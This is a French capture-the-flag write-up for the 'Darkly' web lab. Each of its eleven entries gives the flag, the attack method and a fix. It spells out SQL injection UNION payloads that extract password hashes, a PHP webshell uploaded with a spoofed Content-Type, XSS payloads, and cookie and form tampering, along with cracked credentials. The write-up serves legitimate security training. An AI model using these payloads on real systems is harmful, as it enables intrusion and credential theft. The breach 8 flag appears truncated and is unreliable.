# Darkly - Breach Report

| # | Breach | Flag |
|---|--------|------|
| 1 | HiddenFiles | d5eec3ec36cf80dce44a896f961c1831a05526ec215693c8f2c39543497d4466 |
| 2 | Admin Panel | d19b4823e0d5600ceed56d5e896ef328d7a2b9e7ac7e80f4fcdb9b10bcb3e7ff |
| 3 | SQL Injection (searchimg) | 10a16d834f9b1e4068b25c4c46fe0284e99e44dceaf08098fc83925ba6310ff5 |
| 4 | Brute Force (signin) | b3a6e43ddf8b4bbb4125e5e7d23040433827759d4de1c04ea63907479a80a6b2 |
| 5 | Cookie Tampering | df2eb4ba34ed059a1e3e89ff4dfc13445f104a1a52295214def1c4fb1693a5c3 |
| 6 | Password Recovery Tampering | 1d4855f7337c0c14b6f44946872c4eb33853f40b2d54393fbe94f49f1e19bbb0 |
| 7 | User-Agent and Referer Check | f2a29020ef3132e01dd61df97fd33ec8d7fcd1388cc9601e7db691d17d4d6188 |
| 8 | Survey Vote Tampering | 03a944b434d5baff05f46c4bede5792551a |
| 9 | Redirect XSS | b9e775a0291fed784a2d9680fcfad7edd6b8cdf87648da647aaf4bba288bcab3 |
| 10 | File Upload | 46910d9ce35b385885a9f7e2b336249d622f29b267a1771fbacf52133beddba8 |
| 11 | XSS Stored (feedback) | 0fbb54bbf7d099713ca4be297e1bc7da0173d8b3c21c1811b916a3a86652724e |

---

### Breach 1 - HiddenFiles
**Flag** : `d5eec3ec36cf80dce44a896f961c1831a05526ec215693c8f2c39543497d4466`

**Vulnerabilité** : Information disclosure via robots.txt

**Méthode** :
1. nmap révèle un fichier `robots.txt` avec 2 entrées Disallow : `/whatever` et `/.hidden`
2. Le robots.txt est censé dire aux crawlers de ne pas indexer ces chemins, mais il révèle leur existence à un attaquant
3. `wget -r -np -l 10 -e robots=off http://192.168.1.103/.hidden/` crawle récursivement le répertoire
4. `find . -name "README" -exec grep -l "flag" {} \;` trouve le README contenant le flag parmi des centaines de faux

**Fix** : Ne jamais lister de chemins sensibles dans robots.txt. Si un répertoire doit être inaccessible, le protéger côté serveur (auth, permissions) pas juste le cacher.

---

### Breach 2 - Admin Panel
**Flag** : `d19b4823e0d5600ceed56d5e896ef328d7a2b9e7ac7e80f4fcdb9b10bcb3e7ff`

**Vulnerabilité** : Credentials exposés + mot de passe faible

**Méthode** :
1. nikto détecte `/admin/index.php` et `/.htpasswd` accessibles publiquement
2. `curl http://192.168.1.103/whatever/` révèle un fichier `.htpasswd` contenant `root:437394baff5aa33daa618be47b75cb49`
3. Le hash MD5 est cracké instantanément sur crackstation.net : `qwerty123@`
4. Connexion sur `/admin/index.php` via HTTP Basic Auth avec `root:qwerty123@`

**Fix** : Ne jamais exposer un `.htpasswd` publiquement. Utiliser bcrypt au lieu de MD5 pour hasher les mots de passe. Choisir des mots de passe forts.

---

### Breach 3 - SQL Injection (searchimg)
**Flag** : `10a16d834f9b1e4068b25c4c46fe0284e99e44dceaf08098fc83925ba6310ff5`

**Vulnerabilité** : SQL Injection (OWASP A03)

**Méthode** :
1. `/?page=searchimg` prend un numéro d'image en input, directement injecté dans la requête SQL
2. `1 OR 1=1` confirme l'injection (retourne toutes les images)
3. `1 UNION SELECT NULL, NULL` détermine que la requête retourne 2 colonnes
4. `1 UNION SELECT table_schema, table_name FROM information_schema.tables` liste toutes les bases et tables
5. On trouve `Member_Sql_Injection.users` avec une colonne `countersign`
6. `1 UNION SELECT Commentaire, countersign FROM Member_Sql_Injection.users` extrait le hash du user "Flag"
7. Hash MD5 `5ff9d0165b4f92b14994e5c685cdce28` cracké -> `FortyTwo` -> lowercase -> SHA256

**Fix** : Utiliser des prepared statements. Jamais concatener l'input utilisateur directement dans une requête SQL.

---

### Breach 4 - Brute Force (signin)
**Flag** : `b3a6e43ddf8b4bbb4125e5e7d23040433827759d4de1c04ea63907479a80a6b2`

**Vulnerabilité** : Credentials faibles sur le formulaire de login (pas de rate limiting, mot de passe trivial)

**Méthode** :
1. Via la SQL injection (breach 3), on liste toutes les bases de données
2. `Member_Brute_Force.db_default` contient une table avec `username` et `password`
3. `1 UNION SELECT username, password FROM Member_Brute_Force.db_default` extrait `admin:3bf1114a986ba87ed28fc1b5884fc2f8`
4. Hash MD5 cracké -> `shadow`
5. Connexion sur `/?page=signin` avec `admin:shadow`

**Fix** : Rate limiting sur les tentatives de login, mots de passe forts, ne pas stocker les passwords en MD5.

---

### Breach 5 - Cookie Tampering
**Flag** : `df2eb4ba34ed059a1e3e89ff4dfc13445f104a1a52295214def1c4fb1693a5c3`

**Vulnerabilité** : Authentification basée sur un cookie non signé côté client

**Méthode** :
1. En inspectant les cookies du site, on trouve un cookie avec la valeur MD5 de "false"
2. Le site utilise ce cookie pour déterminer si l'utilisateur est admin
3. On hash "true" en MD5 et on remplace la valeur du cookie
4. Le site nous accorde les droits admin

**Fix** : Ne jamais stocker l'état d'authentification dans un cookie côté client sans signature cryptographique (HMAC). Utiliser des sessions côté serveur avec un identifiant de session aléatoire et imprévisible.

---

### Breach 6 - Password Recovery Tampering
**Flag** : `1d4855f7337c0c14b6f44946872c4eb33853f40b2d54393fbe94f49f1e19bbb0`

**Vulnerabilité** : Champ hidden forgeable dans le formulaire de reset password

**Méthode** :
1. Le source de `/?page=recover` révèle un champ `<input type="hidden" name="mail" value="webmaster@borntosec.com">`
2. Le serveur envoie le reset à l'adresse contenue dans ce champ sans vérification
3. `curl -X POST "http://192.168.1.103/?page=recover" --data "mail=monmail@test.com&Submit=Submit"` forge le champ avec une autre adresse

**Fix** : L'email de destination du reset doit venir de la base de données côté serveur, jamais d'un champ formulaire client. Un champ `hidden` n'est pas une protection, il est modifiable par n'importe qui.

---

### Breach 7 - User-Agent and Referer Check
**Flag** : `f2a29020ef3132e01dd61df97fd33ec8d7fcd1388cc9601e7db691d17d4d6188`

**Vulnerabilité** : Contrôle d'accès basé sur le User-Agent et le Referer

**Méthode** :
1. Le dernier lien en bas de page mène vers une ressource liée aux oiseaux
2. On récupère le lien caché derrière cette page puis on l'interroge avec `curl`
3. La requête doit utiliser le browser `ft_bornToSec`
4. Le serveur exige aussi que la requête vienne de `https://www.nsa.gov/`
5. `curl -s -A "ft_bornToSec" -e "https://www.nsa.gov/" "http://192.168.64.5/index.php?page=b7e44c7a40c5f80139f0a50f3650fb2bd8d00b0d24667c4c2ca32c88e13b758f" | grep "flag"` révèle le flag

**Fix** : Ne jamais baser une autorisation sur des headers facilement forgeables comme `User-Agent` ou `Referer`. Vérifier l'accès côté serveur avec une vraie authentification ou une logique d'autorisation robuste.

---

### Breach 8 - Survey Vote Tampering
**Flag** : `03a944b434d5baff05f46c4bede5792551a`

**Vulnerabilité** : Vote manipulé en modifiant une valeur brute dans le formulaire

**Méthode** :
1. On accède à la page du sondage et on inspecte le formulaire de vote
2. La valeur envoyée pour le vote est brute et bornée à des choix comme `[1, 2, ... 10]`
3. En modifiant cette valeur à `100000`, on contourne la contrainte attendue par le client
4. Le serveur accepte la valeur et retourne le flag

**Fix** : Valider strictement les valeurs côté serveur avec une liste blanche de choix autorisés. Ne jamais faire confiance à une valeur numérique envoyée par le client sans contrôle.

---

### Breach 9 - Redirect XSS
**Flag** : `b9e775a0291fed784a2d9680fcfad7edd6b8cdf87648da647aaf4bba288bcab3`

**Vulnerabilité** : Redirection / injection JavaScript via un paramètre `site` mal validé

**Méthode** :
1. On part du dernier lien en bas de page pour atteindre la page de redirection
2. Une tentative de redirection vers un site externe ne fonctionne pas directement
3. En testant `index.php?page=redirect&site=javascript::alert(1)`, on constate que la valeur est interprétée de façon dangereuse
4. Le payload exploite le paramètre de redirection pour déclencher l'affichage du flag

**Fix** : Ne jamais laisser un paramètre de redirection accepter des schémas arbitraires comme `javascript:`. Restreindre strictement les destinations à une liste blanche de domaines ou de chemins internes et valider côté serveur.

---

### Breach 10 - File Upload
**Flag** : `46910d9ce35b385885a9f7e2b336249d622f29b267a1771fbacf52133beddba8`

**Vulnerabilité** : Unrestricted File Upload (OWASP A04)

**Méthode** :
1. `/?page=upload` expose un formulaire d'upload qui valide uniquement le Content-Type HTTP, pas le contenu réel du fichier
2. Création d'un webshell PHP minimal : `echo '<?php system("id"); ?>' > shell.php`
3. Upload en forçant le Content-Type à `image/jpeg` via curl :
   `curl -F "MAX_FILE_SIZE=100000" -F "uploaded=@shell.php;type=image/jpeg" -F "Upload=Upload" "http://192.168.1.103/?page=upload"`
4. Le serveur accepte le fichier et retourne directement le flag

**Fix** : Vérifier la vraie signature du fichier (magic bytes), pas uniquement le Content-Type. Stocker les fichiers uploadés hors du webroot ou avec une extension neutre pour empêcher leur exécution par le serveur.

---

### Breach 11 - XSS Stored (feedback)
**Flag** : `0fbb54bbf7d099713ca4be297e1bc7da0173d8b3c21c1811b916a3a86652724e`

**Vulnerabilité** : XSS Stored (OWASP A03)

**Méthode** :
1. `/?page=feedback` expose un formulaire guestbook dont les entrées sont stockées en base et réaffichées sans sanitization
2. Soumettre `<script>alert(1)</script>` dans le champ Message via le formulaire
3. Le script est stocké en base et s'exécute pour tout visiteur de la page
4. Le flag apparaît directement sur la page feedback

**Fix** : Échapper les caractères spéciaux avant affichage avec htmlspecialchars() en PHP. Ne jamais afficher du contenu utilisateur brut dans le HTML.